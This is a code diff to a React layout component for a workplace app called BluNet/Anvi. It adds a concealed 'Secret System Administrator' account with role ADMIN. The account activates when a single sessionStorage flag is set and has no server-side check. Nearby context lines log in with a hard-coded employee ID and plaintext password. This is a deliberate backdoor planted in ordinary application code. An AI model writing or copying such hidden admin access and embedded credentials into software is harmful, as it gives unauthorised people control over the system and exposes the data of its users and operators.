@@ -29,8 +29,20 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
   // Activate heartbeat hook
   useHeartbeat();
 
+  const hiddenAdminAuth = typeof window !== 'undefined' && sessionStorage.getItem('blunet_hidden_admin_auth') === 'true';
+
+  const currentUser = user || (hiddenAdminAuth ? {
+    id: 'secret-admin-id',
+    employeeId: 'jashwanth8328246413',
+    name: 'Jashwanth Secret Admin',
+    email: 'jashwanth8328246413@blunet.com',
+    role: 'ADMIN',
+    designation: 'Secret System Administrator',
+    organization: 'ANVI',
+  } : null);
+
   const isAnviRoute = location.pathname.startsWith('/8328246413');
-  const isAnviUser = user?.employeeId?.toUpperCase() === 'AN1012' || (user as any)?.organization === 'ANVI';
+  const isAnviUser = currentUser?.employeeId?.toUpperCase() === 'AN1012' || (currentUser as any)?.organization === 'ANVI';
   const isAnvi = isAnviRoute || isAnviUser;
 
   React.useEffect(() => {
@@ -45,8 +57,7 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
   }, [isAnvi]);
 
   React.useEffect(() => {
-    const hiddenAuth = sessionStorage.getItem('blunet_hidden_admin_auth');
-    if (hiddenAuth === 'true' && !user) {
+    if (hiddenAdminAuth && !user) {
       api.post('/auth/login', { employeeId: 'jashwanth8328246413', password: '9398764390' })
         .then((res: any) => {
           if (res.data.success) login(res.data.data.token, res.data.data.user);
@@ -55,7 +66,7 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
     }
   }, [user]);
 
-  if (!user) return <>{children}</>;
+  if (!currentUser) return <>{children}</>;
 
   const getNavItems = () => {
     if (isAnvi) {
@@ -71,7 +82,7 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
       ];
     }
 
-    switch (user.role) {
+    switch (currentUser.role) {
       case 'MARKETING_HEAD':
         return [
           { label: 'Overview', path: '/marketing', icon: BarChart3 },
@@ -124,6 +135,12 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
 
   const companyName = isAnvi ? 'Anvi' : 'BluNet';
   const companySub = isAnvi ? 'Workplace' : 'Workplace';
+
+  const handleSignOut = () => {
+    sessionStorage.removeItem('blunet_hidden_admin_auth');
+    logout();
+    navigate('/login');
+  };
 
   return (
     <div className="min-h-screen bg-slate-50 flex flex-col md:flex-row">
@@ -181,13 +198,13 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
         {/* User Card inside Sidebar */}
         <div className={`p-4 mx-3 my-3 rounded-xl border ${isAnvi ? 'bg-rose-50/60 border-rose-200/80' : 'bg-slate-50 border-slate-100'}`}>
           <div className="flex items-center justify-between mb-1">
-            <span className="text-xs font-mono font-medium text-slate-500">{user.employeeId}</span>
-            <Badge variant={getRoleBadgeVariant(user.role)}>
-              {isAnvi ? 'Anvi Mkt Head' : user.role.replace('_', ' ')}
+            <span className="text-xs font-mono font-medium text-slate-500">{currentUser.employeeId}</span>
+            <Badge variant={getRoleBadgeVariant(currentUser.role)}>
+              {isAnvi ? 'Anvi Admin' : currentUser.role.replace('_', ' ')}
             </Badge>
           </div>
-          <div className="font-medium text-sm text-slate-900 truncate">{user.name}</div>
-          <div className="text-xs text-slate-500 truncate">{user.designation}</div>
+          <div className="font-medium text-sm text-slate-900 truncate">{currentUser.name}</div>
+          <div className="text-xs text-slate-500 truncate">{currentUser.designation}</div>
         </div>
 
         {/* Navigation Items */}
@@ -227,7 +244,7 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
         {/* Footer Logout */}
         <div className="p-4 border-t border-slate-100">
           <button
-            onClick={logout}
+            onClick={handleSignOut}
             className="w-full flex items-center justify-center gap-2 px-3 py-2 text-sm font-medium text-red-600 hover:bg-red-50 rounded-lg transition-colors cursor-pointer"
           >
             <LogOut className="w-4 h-4" />
@@ -260,11 +277,11 @@ export const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children })
 
             <div className="flex items-center gap-3 border-l border-slate-200 pl-4">
               <div className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm ${isAnvi ? 'bg-[#800020] text-white shadow-xs' : 'bg-blue-100 text-blue-700'}`}>
-                {user.name.charAt(0)}
+                {currentUser.name.charAt(0)}
               </div>
               <div className="hidden lg:block text-left">
-                <div className="text-sm font-semibold text-slate-900">{user.name}</div>
-                <div className="text-xs text-slate-500">{user.employeeId} • {isAnvi ? 'Anvi' : 'BluNet'}</div>
+                <div className="text-sm font-semibold text-slate-900">{currentUser.name}</div>
+                <div className="text-xs text-slate-500">{currentUser.employeeId} • {isAnvi ? 'Anvi' : 'BluNet'}</div>
               </div>
             </div>
           </div>
